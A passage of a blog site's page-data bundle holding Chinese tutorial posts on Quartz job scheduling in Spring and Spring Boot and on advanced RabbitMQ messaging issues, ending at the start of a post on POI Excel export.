Back-end"],isShowComments:!1},regularPath:"/views/backend/quartz.html",relativePath:"views/backend/quartz.md",key:"v-b4e1c3dc",path:"/views/backend/quartz.html",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:3},{level:2,title:"使用场景",slug:"使用场景",normalizedTitle:"使用场景",charIndex:9},{level:2,title:"简要步骤",slug:"简要步骤",normalizedTitle:"简要步骤",charIndex:17},{level:2,title:"Cron表达式",slug:"cron表达式",normalizedTitle:"cron表达式",charIndex:25},{level:2,title:"Spring整合Quartz",slug:"spring整合quartz",normalizedTitle:"spring整合quartz",charIndex:36},{level:3,title:"applicationContext-quartz.xml配置",slug:"applicationcontext-quartz-xml配置",normalizedTitle:"applicationcontext-quartz.xml配置",charIndex:56},{level:3,title:"业务类",slug:"业务类",normalizedTitle:"业务类",charIndex:93},{level:2,title:"SpringBoot整合Quartz",slug:"springboot整合quartz",normalizedTitle:"springboot整合quartz",charIndex:100},{level:3,title:"依赖",slug:"依赖",normalizedTitle:"依赖",charIndex:124},{level:2,title:"任务类",slug:"任务类",normalizedTitle:"任务类",charIndex:130},{level:2,title:"可能遇到的问题",slug:"可能遇到的问题",normalizedTitle:"可能遇到的问题",charIndex:137},{level:3,title:"在实现Job接口的业务类中无法注入其他bean",slug:"在实现job接口的业务类中无法注入其他bean",normalizedTitle:"在实现job接口的业务类中无法注入其他bean",charIndex:150},{level:2,title:"其它",slug:"其它",normalizedTitle:"其它",charIndex:177}],headersStr:"简介 使用场景 简要步骤 Cron表达式 Spring整合Quartz applicationContext-quartz.xml配置 业务类 SpringBoot整合Quartz 依赖 任务类 可能遇到的问题 在实现Job接口的业务类中无法注入其他bean 其它",content:' * 简介\n * 使用场景\n * 简要步骤\n * Cron表达式\n * Spring整合Quartz\n   * applicationContext-quartz.xml配置\n   * 业务类\n * SpringBoot整合Quartz\n   * 依赖\n * 任务类\n * 可能遇到的问题\n   * 在实现Job接口的业务类中无法注入其他bean\n * 其它\n\n\n\n\n# 简介\n\n> Quartz快速入门指南：https://www.w3cschool.cn/quartz_doc/\n\n * Quartz 是一个完全由 Java 编写的开源作业调度框架，为在 Java 应用程序中进行作业调度提供了简单却强大的机制。\n * 需要注意的是：Spring3.1+版本支持Quartz2.x，对Spring3.1-版本请使用Quartz1.x。（另外Quzrtz2.x版本升级比较大，相比较Quartz1.x配置时请把 CronTriggerBean 改为 CronTriggerFactoryBean）\n\n\n# 使用场景\n\n * 定时生成报表\n * 定时发送邮件\n * 定时发送短信 sms\n * 数据库(表)与数据库(表) 同步数据/备份数据\n * QQ会员到期\n\n\n# 简要步骤\n\n> 以下4步中：4依赖3 --\x3e 3依赖2 --\x3e 2依赖1\n\n 1. 业务【 Job 】：我们自己手写的业务类（可以有多个）\n 2. 任务【 JobDetail 】：我们要对哪个业务进行操作，或者具体对业务类里的哪个方法操作（可以有多个）\n 3. 触发器【 Trigger 】：即Cron表达式，什么时间触发这个任务（可以有多个）\n 4. 调度器【 Scheduler 】：当我们配置好上述参数时，由Quartz的Scheduler 容器调度（只能有一个，一个调度器可以注册多个JobDetail 和 Trigger）\n\n\n# Cron表达式\n\nCron表达式的时间字段除允许设置数值外，还可使用一些特殊的字符，提供列表、范围、通配符等功能，细说如下：\n\n名称       释义\n星号(*)：   可用在所有字段中，表示对应时间域的每一个时刻，例如，*在分钟字段时，表示“每分钟”；\n问号(?）：   该字符只在日期和星期字段中使用，它通常指定为“无意义的值”，相当于点位符；\n减号(-)：   表达一个范围，如在小时字段中使用“10-12”，则表示从10到12点，即10,11,12；\n逗号(,)：   表达一个列表值，如在星期字段中使用“MON,WED,FRI”，则表示星期一，星期三和星期五；\n斜杠(/)：   x/y表达一个等步长序列，x为起始值，y为增量步长值。如在分钟字段中使用0/15，则表示为0,15,30和45秒，而5/15在分钟字段中表示5,20,35,50，你也可以使用*/y，它等同于0/y；\n\n名称   是否必须   允许值              允许的通配符\n秒    是      0-59             , - * /\n分    是      0-59             , - * /\n时    是      0-23             , - * /\n日    是      1-31             , - * / L W ?\n月    是      1-12 或 JAN-DEC   , - * /\n周    是      1-7 或 SUN-SAT    , - * / L # ?\n年    否      空 或 1970-2099    , - * /\n\n * 在线Corn表达式生成器：http://cron.qqe2.com\n\n\n# Spring整合Quartz\n\n\n# applicationContext-quartz.xml配置\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n\txmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n\txmlns:context="http://www.springframework.org/schema/context"\n\txsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.2.xsd\n\t\thttp://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd">\n\n\t\x3c!-- 1.业务 我们自己手写的类--\x3e\n\t<bean id="jobTask" class="com.etoak.task.Job" />\n\t\t\n\t\x3c!-- 2.任务   --\x3e\n\t<bean id="jobDetail"  class="org.springframework.scheduling.quartz.MethodInvokingJobDetailFactoryBean">\n\t\t\n\t\t\x3c!-- 任务调用业务目标对象 Job对象 --\x3e\n\t\t<property name="targetObject" ref="jobTask"></property>\n\t\t\x3c!-- 任务调用业务目标对象方法名称 job方法 --\x3e\n\t\t<property name="targetMethod" value="job"></property>\n\t\t\x3c!-- false防止并发执行 --\x3e\n\t\t<property name="concurrent" value="false"></property>\n\t\n\t</bean>\t\t\n\t\n\t\x3c!-- 3.触发器 --\x3e\n\t<bean id="cronTriggerBean" class="org.springframework.scheduling.quartz.CronTriggerBean">\n\t\t\x3c!-- 注入任务 --\x3e\n\t\t<property name="jobDetail" ref="jobDetail"></property>\n\t\t\x3c!-- \n\t\t\t执行触发时间 ，  一旦时间触发 调用任务 \t\n\t\t    cron表达式  使用日期和星期  必须有个为问号（？） 而且不能同时出现问号（？）\n\t\t--\x3e\n\t\t<property name="cronExpression" value="0 0/5 * * * ?"></property>\n\t</bean>\n\t\n\t\x3c!-- \n\t\t4.调度器   监听器 \n\t\t容器启动 触发调度器  处于监听\t\n\t--\x3e\n\t<bean class="org.springframework.scheduling.quartz.SchedulerFactoryBean">\n\t\t\x3c!-- 监听触发器 --\x3e\n\t\t<property name="triggers">\n\t\t\t<list>\n\t\t\t\t<ref bean="cronTriggerBean" />\n\t\t\t</list>\n\t\t</property>\n\t</bean>\n\t\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# 业务类\n\npackage com.zpj80231.task;\n\nimport com.zpj80231.bean.User;\nimport com.zpj80231.mapper.UserMapper;\nimport org.springframework.beans.factory.annotation.Autowired;\n\nimport java.util.List;\n\n//1.业务\npublic class Job {\n\t\n\t@Autowired\n\tprivate UserMapper mapper;\n\t\n\t/**\n\t *  定时任务 自定义方法时\n\t * \t不需要加入返回值\n\t * \t方法不能加入参数\n\t * \n\t * \t不能接收请求\n\t * \t不能响应请求\n\t */\n\tpublic void job() {\n\t\tList<User> list = mapper.getAll();\n\t\tfor(User user:list) {\n\t\t\tSystem.out.println(user.getUsername());\n\t\t\tSystem.out.println("-----------------");\n\t\t}\t\n\t}\n\t\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# SpringBoot整合Quartz\n\n> 两个注解搞定\n\n * 启动类添加@EnableScheduling\n * 定时任务类的方法上添加@Scheduled\n\n\n# 依赖\n\n<dependency>  \n    <groupId>org.quartz-scheduler</groupId>  \n    <artifactId>quartz</artifactId>  \n    <version>2.2.3</version>  \n</dependency> \n<dependency>  \n    <groupId>org.quartz-scheduler</groupId>  \n    <artifactId>quartz-jobs</artifactId>  \n    <version>2.2.3</version>  \n</dependency>\n<dependency>\x3c!-- 该依赖必加，里面有sping对schedule的支持 --\x3e\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-context-support</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 任务类\n\npackage com.zpj80231.task;\n\nimport java.util.Date;\n\nimport org.springframework.scheduling.annotation.Scheduled;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class JobAnno {\n\t\n    @Autowire\n    private XXXX xxxx;\n    \n\t/**\n\t * 定时任务 自定义方法时\n\t * \t不需要加入返回值\n\t * \t方法不能加入参数\n\t * \n\t * \t不能接收请求\n\t * \t不能响应请求\n\t */\n\t@Scheduled(cron="0/10 * * * * ?")\n\tpublic void jobAnno() {\n\t\tSystem.out.println("jobAnno:" + new Date() + xxxx.xxXX());\n\t}\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 可能遇到的问题\n\n\n# 在实现Job接口的业务类中无法注入其他bean\n\n * 在job任务类的执行方法中通过ApplicationContext.getBean()来获得 -- 传送们\n\n\n# 其它\n\n * Springboot整合Quartz实现动态定时任务\n * 在Spring中的话通过 实现定时任务的几种方式 里的RAMQuartz实现ServletContextListener重写contextInitialized方法实现定时任务',normalizedContent:' * 简介\n * 使用场景\n * 简要步骤\n * cron表达式\n * spring整合quartz\n   * applicationcontext-quartz.xml配置\n   * 业务类\n * springboot整合quartz\n   * 依赖\n * 任务类\n * 可能遇到的问题\n   * 在实现job接口的业务类中无法注入其他bean\n * 其它\n\n\n\n\n# 简介\n\n> quartz快速入门指南：https://www.w3cschool.cn/quartz_doc/\n\n * quartz 是一个完全由 java 编写的开源作业调度框架，为在 java 应用程序中进行作业调度提供了简单却强大的机制。\n * 需要注意的是：spring3.1+版本支持quartz2.x，对spring3.1-版本请使用quartz1.x。（另外quzrtz2.x版本升级比较大，相比较quartz1.x配置时请把 crontriggerbean 改为 crontriggerfactorybean）\n\n\n# 使用场景\n\n * 定时生成报表\n * 定时发送邮件\n * 定时发送短信 sms\n * 数据库(表)与数据库(表) 同步数据/备份数据\n * qq会员到期\n\n\n# 简要步骤\n\n> 以下4步中：4依赖3 --\x3e 3依赖2 --\x3e 2依赖1\n\n 1. 业务【 job 】：我们自己手写的业务类（可以有多个）\n 2. 任务【 jobdetail 】：我们要对哪个业务进行操作，或者具体对业务类里的哪个方法操作（可以有多个）\n 3. 触发器【 trigger 】：即cron表达式，什么时间触发这个任务（可以有多个）\n 4. 调度器【 scheduler 】：当我们配置好上述参数时，由quartz的scheduler 容器调度（只能有一个，一个调度器可以注册多个jobdetail 和 trigger）\n\n\n# cron表达式\n\ncron表达式的时间字段除允许设置数值外，还可使用一些特殊的字符，提供列表、范围、通配符等功能，细说如下：\n\n名称       释义\n星号(*)：   可用在所有字段中，表示对应时间域的每一个时刻，例如，*在分钟字段时，表示“每分钟”；\n问号(?）：   该字符只在日期和星期字段中使用，它通常指定为“无意义的值”，相当于点位符；\n减号(-)：   表达一个范围，如在小时字段中使用“10-12”，则表示从10到12点，即10,11,12；\n逗号(,)：   表达一个列表值，如在星期字段中使用“mon,wed,fri”，则表示星期一，星期三和星期五；\n斜杠(/)：   x/y表达一个等步长序列，x为起始值，y为增量步长值。如在分钟字段中使用0/15，则表示为0,15,30和45秒，而5/15在分钟字段中表示5,20,35,50，你也可以使用*/y，它等同于0/y；\n\n名称   是否必须   允许值              允许的通配符\n秒    是      0-59             , - * /\n分    是      0-59             , - * /\n时    是      0-23             , - * /\n日    是      1-31             , - * / l w ?\n月    是      1-12 或 jan-dec   , - * /\n周    是      1-7 或 sun-sat    , - * / l # ?\n年    否      空 或 1970-2099    , - * /\n\n * 在线corn表达式生成器：http://cron.qqe2.com\n\n\n# spring整合quartz\n\n\n# applicationcontext-quartz.xml配置\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n\txmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n\txmlns:context="http://www.springframework.org/schema/context"\n\txsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.2.xsd\n\t\thttp://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd">\n\n\t\x3c!-- 1.业务 我们自己手写的类--\x3e\n\t<bean id="jobtask" class="com.etoak.task.job" />\n\t\t\n\t\x3c!-- 2.任务   --\x3e\n\t<bean id="jobdetail"  class="org.springframework.scheduling.quartz.methodinvokingjobdetailfactorybean">\n\t\t\n\t\t\x3c!-- 任务调用业务目标对象 job对象 --\x3e\n\t\t<property name="targetobject" ref="jobtask"></property>\n\t\t\x3c!-- 任务调用业务目标对象方法名称 job方法 --\x3e\n\t\t<property name="targetmethod" value="job"></property>\n\t\t\x3c!-- false防止并发执行 --\x3e\n\t\t<property name="concurrent" value="false"></property>\n\t\n\t</bean>\t\t\n\t\n\t\x3c!-- 3.触发器 --\x3e\n\t<bean id="crontriggerbean" class="org.springframework.scheduling.quartz.crontriggerbean">\n\t\t\x3c!-- 注入任务 --\x3e\n\t\t<property name="jobdetail" ref="jobdetail"></property>\n\t\t\x3c!-- \n\t\t\t执行触发时间 ，  一旦时间触发 调用任务 \t\n\t\t    cron表达式  使用日期和星期  必须有个为问号（？） 而且不能同时出现问号（？）\n\t\t--\x3e\n\t\t<property name="cronexpression" value="0 0/5 * * * ?"></property>\n\t</bean>\n\t\n\t\x3c!-- \n\t\t4.调度器   监听器 \n\t\t容器启动 触发调度器  处于监听\t\n\t--\x3e\n\t<bean class="org.springframework.scheduling.quartz.schedulerfactorybean">\n\t\t\x3c!-- 监听触发器 --\x3e\n\t\t<property name="triggers">\n\t\t\t<list>\n\t\t\t\t<ref bean="crontriggerbean" />\n\t\t\t</list>\n\t\t</property>\n\t</bean>\n\t\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# 业务类\n\npackage com.zpj80231.task;\n\nimport com.zpj80231.bean.user;\nimport com.zpj80231.mapper.usermapper;\nimport org.springframework.beans.factory.annotation.autowired;\n\nimport java.util.list;\n\n//1.业务\npublic class job {\n\t\n\t@autowired\n\tprivate usermapper mapper;\n\t\n\t/**\n\t *  定时任务 自定义方法时\n\t * \t不需要加入返回值\n\t * \t方法不能加入参数\n\t * \n\t * \t不能接收请求\n\t * \t不能响应请求\n\t */\n\tpublic void job() {\n\t\tlist<user> list = mapper.getall();\n\t\tfor(user user:list) {\n\t\t\tsystem.out.println(user.getusername());\n\t\t\tsystem.out.println("-----------------");\n\t\t}\t\n\t}\n\t\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# springboot整合quartz\n\n> 两个注解搞定\n\n * 启动类添加@enablescheduling\n * 定时任务类的方法上添加@scheduled\n\n\n# 依赖\n\n<dependency>  \n    <groupid>org.quartz-scheduler</groupid>  \n    <artifactid>quartz</artifactid>  \n    <version>2.2.3</version>  \n</dependency> \n<dependency>  \n    <groupid>org.quartz-scheduler</groupid>  \n    <artifactid>quartz-jobs</artifactid>  \n    <version>2.2.3</version>  \n</dependency>\n<dependency>\x3c!-- 该依赖必加，里面有sping对schedule的支持 --\x3e\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-context-support</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 任务类\n\npackage com.zpj80231.task;\n\nimport java.util.date;\n\nimport org.springframework.scheduling.annotation.scheduled;\nimport org.springframework.stereotype.component;\n\n@component\npublic class jobanno {\n\t\n    @autowire\n    private xxxx xxxx;\n    \n\t/**\n\t * 定时任务 自定义方法时\n\t * \t不需要加入返回值\n\t * \t方法不能加入参数\n\t * \n\t * \t不能接收请求\n\t * \t不能响应请求\n\t */\n\t@scheduled(cron="0/10 * * * * ?")\n\tpublic void jobanno() {\n\t\tsystem.out.println("jobanno:" + new date() + xxxx.xxxx());\n\t}\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 可能遇到的问题\n\n\n# 在实现job接口的业务类中无法注入其他bean\n\n * 在job任务类的执行方法中通过applicationcontext.getbean()来获得 -- 传送们\n\n\n# 其它\n\n * springboot整合quartz实现动态定时任务\n * 在spring中的话通过 实现定时任务的几种方式 里的ramquartz实现servletcontextlistener重写contextinitialized方法实现定时任务',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"RabbitMQ - 进阶",frontmatter:{title:"RabbitMQ - 进阶",date:"2019-09-21T00:00:00.000Z",tags:["RabbitMQ"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/rabbitmq002.html",relativePath:"views/backend/rabbitmq002.md",key:"v-bf14b658",path:"/views/backend/rabbitmq002.html",headers:[{level:2,title:"使用场景",slug:"使用场景",normalizedTitle:"使用场景",charIndex:3},{level:2,title:"问题",slug:"问题",normalizedTitle:"问题",charIndex:11},{level:3,title:"消息丢失（可靠性）",slug:"消息丢失-可靠性",normalizedTitle:"消息丢失（可靠性）",charIndex:19},{level:3,title:"顺序消费",slug:"顺序消费",normalizedTitle:"顺序消费",charIndex:34},{level:3,title:"重复消费",slug:"重复消费",normalizedTitle:"重复消费",charIndex:44},{level:3,title:"消息补偿机制",slug:"消息补偿机制",normalizedTitle:"消息补偿机制",charIndex:54},{level:3,title:"大量数据消费",slug:"大量数据消费",normalizedTitle:"大量数据消费",charIndex:66},{level:3,title:"如何保证高可用",slug:"如何保证高可用",normalizedTitle:"如何保证高可用",charIndex:78},{level:3,title:"大量消息积压",slug:"大量消息积压",normalizedTitle:"大量消息积压",charIndex:91},{level:2,title:"分布式事务",slug:"分布式事务",normalizedTitle:"分布式事务",charIndex:101},{level:2,title:"案例",slug:"案例",normalizedTitle:"案例",charIndex:110}],headersStr:"使用场景 问题 消息丢失（可靠性） 顺序消费 重复消费 消息补偿机制 大量数据消费 如何保证高可用 大量消息积压 分布式事务 案例",content:" * 使用场景\n * 问题\n   * 消息丢失（可靠性）\n   * 顺序消费\n   * 重复消费\n   * 消息补偿机制\n   * 大量数据消费\n   * 如何保证高可用\n   * 大量消息积压\n * 分布式事务\n * 案例\n\n\n\n\n# 使用场景\n\n异步、削峰、解耦\n\n\n# 问题\n\n\n# 消息丢失（可靠性）\n\n * 事前事中事后\n\n\n\n\n# 顺序消费\n\n * 一个topic下有多个队列，为了保证发送有序，RocketMQ提供了MessageQueueSelector队列选择机制，他有三种实现:\n\n * RocketMQ仅保证顺序发送，顺序消费由消费者业务保证！\n\n * 一个队列有序出去，一个消费者消费不就好了？ 消费者是多线程的，你消息是有序的给他的，你能保证他是有序的处理的？还是一个消费成功了再发下一个稳妥。\n\n * rabbimq\n   \n   * 每个 queue 一个 consumer\n\n\n# 重复消费\n\n * 原因\n   \n   * 发给多个系统【库存、积分、活动】时，其他都处理成功但有一个【积分】处理失败（网络抖动，开发人员代码Bug等），触发mq重试。\n\n * 解决方案\n   \n   * 接口幂等（可以用redis做） + 唯一索引。（如下图引用傲丙强校验代码）\n   \n   \n\n\n# 消息补偿机制\n\n为啥要消息补偿：\n\n> 生产者在准备发送MQ的时候，突然生产者宕机；\n> \n> 消息到达MQ后，正在准备持久化到硬盘的过程中MQ宕机了；\n\n * 采用 定时轮询 + db 组合来重试（补偿）消息\n   1. 数据库表里存一条消息的id，消费状态，重试次数，路由键，队列名，交换机名，消息体，生产时间，消费时间等字段。\n   2. 消息补偿服务定时扫库：定时扫出状态为待消费、重试次数小于5次、生产时间大于5分钟的消息，这些消息才会重试。\n   3. 生产者发送消息时先入库，状态为待消费；然后发送消息到MQ。\n   4. MQ中间件正常接受消息，持久化，转发给消费者。\n   5. 消费者收到消息后，判断消息的消费状态，消费后更新消息的消费状态。\n\n\n# 大量数据消费\n\n * 在rabbitMq中采用多个消费者，公平分发的模式去消费队列\n\n\n# 如何保证高可用\n\n * 定义\n   \n   * 镜像集群模式：跟普通集群模式不一样的是，在镜像集群模式下，你创建的 queue，无论元数据还是 queue 里的消息都会存在于多个实例上，就是说，每个 RabbitMQ 节点都有这个 queue 的一个完整镜像，包含 queue 的全部数据的意思。然后每次你写消息到 queue 的时候，都会自动把消息同步到多个实例的 queue 上。\n\n * 开启\n   \n   * 其实很简单，RabbitMQ 有很好的管理控制台，就是在后台新增一个策略，这个策略是镜像集群模式的策略，指定的时候是可以要求数据同步到所有节点的，也可以要求同步到指定数量的节点，再次创建 queue 的时候，应用这个策略，就会自动将数据同步到其他的节点上去了。\n\n * 缺点\n   \n   * 1: 性能开销大: 因为需要进行整个集群内部所有实例的数据同步 2:无法线性扩容: 因为每一个服务器中都包含整个集群服务节点中的所有数据, 这样如果一旦单个服务器节点的容量无法容纳了怎么办?.\n\n\n# 大量消息积压\n\n * 一般这个时候，只能临时紧急扩容了，具体操作步骤和思路如下：\n\n 1. 先修复 consumer 的问题，确保其恢复消费速度，然后将现有 consumer 都停掉。\n 2. 新建一个 topic，partition 是原来的 10 倍，临时建立好原先 10 倍的 queue 数量。\n 3. 然后写一个临时的分发数据的 consumer 程序，这个程序部署上去消费积压的数据，消费之后不做耗时的处理，直接均匀轮询写入临时建立好的 10 倍数量的 queue。\n 4. 接着临时征用 10 倍的机器来部署 consumer，每一批 consumer 消费一个临时 queue 的数据。这种做法相当于是临时将 queue 资源和 consumer 资源扩大 10 倍，以正常的 10 倍速度来消费数据。\n 5. 等快速消费完积压数据之后，得恢复原先部署的架构，重新用原先的 consumer 机器来消费消息。\n\n\n# 分布式事务\n\n * 弊端\n   \n   * 长时间锁定数据库资源，导致系统的响应不快，并发上不去\n   * 网络抖动出现脑裂情况，导致事物参与者，不能很好地执行协调者的指令，导致数据不一致。\n   * 单点故障：例如事物协调者，在某一时刻宕机，虽然可以通过选举机制产生新的Leader，但是这过程中，必然出现问题，而TCC，只有强悍的技术团队，才能支持开发，成本太高。\n\n * 有多种类型\n   \n   * 2pc（两段式提交）\n     \n     * 2pc（两段式提交）可以说是分布式事务的最开始的样子了，像极了媒婆，就是通过消息中间件协调多个系统，在两个系统操作事务的时候都锁定资源但是不提交事务，等两者都准备好了，告诉消息中间件，然后再分别提交事务。\n   \n   * 3pc（三段式提交）\n   \n   * TCC（Try、Confirm、Cancel）\n   \n   * 最大努力通知\n   \n   * XA\n   \n   * 本地消息表（ebay研发出的）\n   \n   * 半消息/最终一致性（RocketMQ）\n\n\n# 案例\n\n订单和支付等\n\n",normalizedContent:" * 使用场景\n * 问题\n   * 消息丢失（可靠性）\n   * 顺序消费\n   * 重复消费\n   * 消息补偿机制\n   * 大量数据消费\n   * 如何保证高可用\n   * 大量消息积压\n * 分布式事务\n * 案例\n\n\n\n\n# 使用场景\n\n异步、削峰、解耦\n\n\n# 问题\n\n\n# 消息丢失（可靠性）\n\n * 事前事中事后\n\n\n\n\n# 顺序消费\n\n * 一个topic下有多个队列，为了保证发送有序，rocketmq提供了messagequeueselector队列选择机制，他有三种实现:\n\n * rocketmq仅保证顺序发送，顺序消费由消费者业务保证！\n\n * 一个队列有序出去，一个消费者消费不就好了？ 消费者是多线程的，你消息是有序的给他的，你能保证他是有序的处理的？还是一个消费成功了再发下一个稳妥。\n\n * rabbimq\n   \n   * 每个 queue 一个 consumer\n\n\n# 重复消费\n\n * 原因\n   \n   * 发给多个系统【库存、积分、活动】时，其他都处理成功但有一个【积分】处理失败（网络抖动，开发人员代码bug等），触发mq重试。\n\n * 解决方案\n   \n   * 接口幂等（可以用redis做） + 唯一索引。（如下图引用傲丙强校验代码）\n   \n   \n\n\n# 消息补偿机制\n\n为啥要消息补偿：\n\n> 生产者在准备发送mq的时候，突然生产者宕机；\n> \n> 消息到达mq后，正在准备持久化到硬盘的过程中mq宕机了；\n\n * 采用 定时轮询 + db 组合来重试（补偿）消息\n   1. 数据库表里存一条消息的id，消费状态，重试次数，路由键，队列名，交换机名，消息体，生产时间，消费时间等字段。\n   2. 消息补偿服务定时扫库：定时扫出状态为待消费、重试次数小于5次、生产时间大于5分钟的消息，这些消息才会重试。\n   3. 生产者发送消息时先入库，状态为待消费；然后发送消息到mq。\n   4. mq中间件正常接受消息，持久化，转发给消费者。\n   5. 消费者收到消息后，判断消息的消费状态，消费后更新消息的消费状态。\n\n\n# 大量数据消费\n\n * 在rabbitmq中采用多个消费者，公平分发的模式去消费队列\n\n\n# 如何保证高可用\n\n * 定义\n   \n   * 镜像集群模式：跟普通集群模式不一样的是，在镜像集群模式下，你创建的 queue，无论元数据还是 queue 里的消息都会存在于多个实例上，就是说，每个 rabbitmq 节点都有这个 queue 的一个完整镜像，包含 queue 的全部数据的意思。然后每次你写消息到 queue 的时候，都会自动把消息同步到多个实例的 queue 上。\n\n * 开启\n   \n   * 其实很简单，rabbitmq 有很好的管理控制台，就是在后台新增一个策略，这个策略是镜像集群模式的策略，指定的时候是可以要求数据同步到所有节点的，也可以要求同步到指定数量的节点，再次创建 queue 的时候，应用这个策略，就会自动将数据同步到其他的节点上去了。\n\n * 缺点\n   \n   * 1: 性能开销大: 因为需要进行整个集群内部所有实例的数据同步 2:无法线性扩容: 因为每一个服务器中都包含整个集群服务节点中的所有数据, 这样如果一旦单个服务器节点的容量无法容纳了怎么办?.\n\n\n# 大量消息积压\n\n * 一般这个时候，只能临时紧急扩容了，具体操作步骤和思路如下：\n\n 1. 先修复 consumer 的问题，确保其恢复消费速度，然后将现有 consumer 都停掉。\n 2. 新建一个 topic，partition 是原来的 10 倍，临时建立好原先 10 倍的 queue 数量。\n 3. 然后写一个临时的分发数据的 consumer 程序，这个程序部署上去消费积压的数据，消费之后不做耗时的处理，直接均匀轮询写入临时建立好的 10 倍数量的 queue。\n 4. 接着临时征用 10 倍的机器来部署 consumer，每一批 consumer 消费一个临时 queue 的数据。这种做法相当于是临时将 queue 资源和 consumer 资源扩大 10 倍，以正常的 10 倍速度来消费数据。\n 5. 等快速消费完积压数据之后，得恢复原先部署的架构，重新用原先的 consumer 机器来消费消息。\n\n\n# 分布式事务\n\n * 弊端\n   \n   * 长时间锁定数据库资源，导致系统的响应不快，并发上不去\n   * 网络抖动出现脑裂情况，导致事物参与者，不能很好地执行协调者的指令，导致数据不一致。\n   * 单点故障：例如事物协调者，在某一时刻宕机，虽然可以通过选举机制产生新的leader，但是这过程中，必然出现问题，而tcc，只有强悍的技术团队，才能支持开发，成本太高。\n\n * 有多种类型\n   \n   * 2pc（两段式提交）\n     \n     * 2pc（两段式提交）可以说是分布式事务的最开始的样子了，像极了媒婆，就是通过消息中间件协调多个系统，在两个系统操作事务的时候都锁定资源但是不提交事务，等两者都准备好了，告诉消息中间件，然后再分别提交事务。\n   \n   * 3pc（三段式提交）\n   \n   * tcc（try、confirm、cancel）\n   \n   * 最大努力通知\n   \n   * xa\n   \n   * 本地消息表（ebay研发出的）\n   \n   * 半消息/最终一致性（rocketmq）\n\n\n# 案例\n\n订单和支付等\n\n",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"POI 多线程多Sheet导出Excel,Csv",frontmatter:{title:"POI 多线程多Sheet导出Excel,Csv",date:"2018-08-20T00:00:00.000Z",tags:["Java","poi","多线程"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/poi.html",relativePath:"views/backend/poi.md",key:"v-845511d8",path:"/views/backend/poi.html",headers:[{level:2,title:"概要",slug:"概要",normalizedTitle:"概要",charIndex:74},{level:2,title:"问题原因",slug:"问题原因",normalizedTitle:"问题原因",charIndex:80},{level:2,title:"解决办法：",slug:"解决办法",normalizedTitle:"解决办法：",charIndex:88},{level:3,title:"1. 调整jvm/tomcat大小",slug:"_1-调整jvm-tomcat大小",normalizedTitle:"1. 调整jvm/tomcat大小",charIndex:99},{level:3,title:"2. 通过新版的SXSSFWorkbook来解决",slug:"_2-通过新版的sxssfworkbook来解决",normalizedTitle:"2. 通过新版的sxssfworkbook来解决",charIndex:122},{level:3,title:"3. 转csv导出",slug:"_3-转csv导出",normalizedTitle:"3. 转csv导出",charIndex:152},{level:3,title:"4. 本地90万数据：输入输出流+poi多线程多sheet导出Excel",slug:"_4-本地90万数据-输入输出流-poi多线程多sheet导出excel",normalizedTitle:"4. 本地90万数据：输入输出流+poi多线程多sheet导出excel",charIndex:167},{level:3,title:"5. 浏览器：多线程多sheet页下载",slug:"_5-浏览器-多线程多sheet页下载",normalizedTitle:"5. 浏览器：多线程多sheet页下载",charIndex:209}],excerpt:"<Boxx/>\n<p>因项目特殊，最近遇到了<code>Excel导出大数据量</code>的问题，所以就趁着解决这个问题的机会，把poi导出Excel再整理一遍，方便自己日后总结。</p>\n",headersStr:"概要 问题原因 解决办法： 1. 调整jvm/tomcat大小 2. 通过新版的SXSSFWorkbook来解决 3. 转csv导出 4. 本地90万数据：输入输出流+poi多线程多sheet导出Excel 5. 浏览器：多线程多sheet页下载",content:'因项目特殊，最近遇到了Excel导出大数据量的问题，所以就趁着解决这个问题的机会，把poi导出Excel再整理一遍，方便自己日后总结。\n\n\n\n * 概要\n * 问题原因\n * 解决办法：\n   * 1. 